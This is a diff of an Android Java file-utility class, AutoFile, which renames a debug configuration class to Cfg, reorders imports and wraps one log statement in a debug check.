@@ -19,12 +19,11 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.util.Date;
 
-import com.android.service.auto.AutoConfig;
-import com.android.service.conf.Configuration;
+import android.util.Log;
+
+import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
-
-import android.util.Log;
 
 /**
  * The Class AutoFlashFile.
@@ -81,7 +80,7 @@ public final class AutoFile {
 			in.read(buffer, 0, length);
 			return buffer;
 		} catch (final IOException e) {
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) { e.printStackTrace(); }
 
 		} finally {
 			if (in != null) {
@@ -89,7 +88,7 @@ public final class AutoFile {
 					in.close();
 				} catch (final IOException e) {
 					// TODO Auto-generated catch block
-					if(AutoConfig.DEBUG) { e.printStackTrace(); }
+					if(Cfg.DEBUG) { e.printStackTrace(); }
 				}
 			}
 		}
@@ -133,7 +132,7 @@ public final class AutoFile {
 				try {
 					out.close();
 				} catch (final IOException e) {
-					Log.d("QZ", TAG + " Error: " + e.toString());
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + e.toString());
 				}
 			}
 		}
